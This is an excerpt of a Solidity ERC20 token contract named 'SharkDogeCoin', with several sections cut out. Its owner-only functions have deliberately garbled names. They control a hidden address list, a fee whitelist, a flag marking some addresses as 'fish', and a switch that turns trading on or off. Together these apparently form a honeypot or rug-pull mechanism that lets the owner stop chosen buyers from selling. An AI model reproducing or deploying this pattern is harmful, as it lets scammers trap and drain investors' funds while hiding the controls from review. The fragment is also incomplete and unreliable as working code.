...
contract bydr is  Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private _name = "SharkDogeCoin";
    string private _symbol = "SHARKDoge";
    ...
    constructor() {
        ...
        swapPairAddress = IUniswapV2Factory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
       swapPairAddress1 = IUniswapV2Factory(_router.factory()).createPair(
            address(this),
            address(0xCf6c787BD82f1B535cbDd27cA4CF7Ac947e7c77E)
        );
        _isSwapPair[swapPairAddress] = true;
        _isSwapPair[swapPairAddress1] = true;
        swapRouter = _router;
        //exclude owner and this contract from fee
        _isWhite[msg.sender] = true;
        _isWhite[swapPairAddress] = true;
    ...
    function asdfasdf23rewsadf(address addr, bool state) external onlyOwner{
        require(addr != address(0), "ERC20: addr the zero address");
        _abcdList[addr] = state;
    }

    function asi3nsienasdfejmc(address addr) public view returns(bool){
        require(addr != address(0), "ERC20: addr the zero address");
        return  _abcdList[addr];
    }

    function setasdfads3as3eqwerdcefwasdf(address addr, bool state) external onlyOwner{
        require(addr != address(0), "ERC20: addr the zero address");
        _isWhite[addr]=state;
    }
    function setasoidfuoasdfeoo29(address addr, bool state) external onlyOwner{
        require(addr != address(0), "ERC20: addr the zero address");
        _isFish[addr] = state;
    }


    function getsdeiwe2jsdfolasdfl(address addr) public view returns (bool){
        return _isFish[addr];
    }

    function getSIdfensd239wjdns(address addr)external view returns(bool){
        require(addr != address(0), "ERC20: addr the zero address");
    ...
    function setasdfio233jelkkas(bool state) external onlyOwner {
        trading = state;
    }
    function getasdfejodlfsdfoioei() public view returns(bool){
        return trading;
    }
    function transferFrom(
        address sender,
    ...
    function _approve(
     ...
     function asdfasjdklfeifoaksdlfioe(address tokenAddress) external onlyOwner {
